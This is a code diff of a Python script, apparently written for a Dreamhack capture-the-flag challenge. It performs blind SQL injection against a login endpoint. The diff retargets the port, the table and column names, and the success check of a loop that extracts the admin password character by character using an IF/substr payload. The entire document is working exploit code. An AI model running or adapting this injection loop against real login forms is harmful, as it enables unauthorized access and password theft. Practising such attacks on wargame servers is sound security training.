@@ -3,7 +3,7 @@ import string
 from alive_progress import alive_bar
 
 def main() :
-    URL = "http://host3.dreamhack.games:12798/login"
+    URL = "http://host3.dreamhack.games:9700/login"
 
     result = ""
 
@@ -12,17 +12,24 @@ def main() :
             for ch in string.printable :
                 # print(f"i : {i}, ch : {ch}")
                 # guest' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = 'admin'), 1, 1) = 'b', 'guest', 'noguest')-- -
-                payload = f"guest\' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = \'admin\'), {i}, 1) = \'{ch}\', \'guest\', \'noguest\')-- -"
+                
+                payload = f"guest\' and userpassword = IF (substr((SELECT userpassword FROM users WHERE userid = \'admin\'), {i}, 1) = \'{ch}\', \'guest\', \'noguest\')-- -"
 
                 data = {
-                    "InputId" : payload,
-                    "InputPassword" : "test"
+                    "userid" : payload,
+                    "userpassword" : "test"
                 }
+
+                # data = {
+                #     "userid" : "guest",
+                #     "userpassword" : "guest"
+                # }
 
                 print("payload", payload)
 
                 response = requests.post(URL, data=data, verify=False)
-                if "Login Success!" in response.text :
+                print(response.text)
+                if "wrong" not in response.text :
                     print(ch)
                     result += ch
                     break
